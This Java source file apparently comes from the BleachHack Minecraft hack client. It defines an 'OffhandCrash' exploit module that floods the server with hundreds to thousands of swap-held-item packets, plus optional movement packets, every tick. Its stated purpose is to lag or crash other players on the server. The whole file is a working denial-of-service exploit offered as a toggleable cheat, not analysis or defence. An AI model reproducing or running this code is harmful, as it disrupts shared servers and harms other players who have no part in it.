package bleach.hack.module.mods;

import java.util.Arrays;
import java.util.List;

import org.lwjgl.glfw.GLFW;

import bleach.hack.gui.clickgui.SettingBase;
import bleach.hack.gui.clickgui.SettingSlider;
import bleach.hack.gui.clickgui.SettingToggle;
import bleach.hack.module.Category;
import bleach.hack.module.Module;
import net.minecraft.server.network.packet.PlayerActionC2SPacket;
import net.minecraft.server.network.packet.PlayerActionC2SPacket.Action;
import net.minecraft.server.network.packet.PlayerMoveC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

public class OffhandCrash extends Module {

	private static List<SettingBase> settings = Arrays.asList(
			new SettingSlider(0, 2000, 420, 0, "Switches: "),
			new SettingToggle(true, "Player Packet"));
	
	public OffhandCrash() {
		super("OffhandCrash", GLFW.GLFW_KEY_P, Category.EXPLOITS, "Lags people using the snowball exploit", settings);
	}
	
	public void onUpdate() {
		for(int i = 0; i < getSettings().get(0).toSlider().getValue(); i++) {
			mc.player.networkHandler.sendPacket(new PlayerActionC2SPacket(Action.SWAP_HELD_ITEMS, BlockPos.ORIGIN, Direction.UP));
			if(getSettings().get(1).toToggle().state) mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket(true));
		}
	}
}
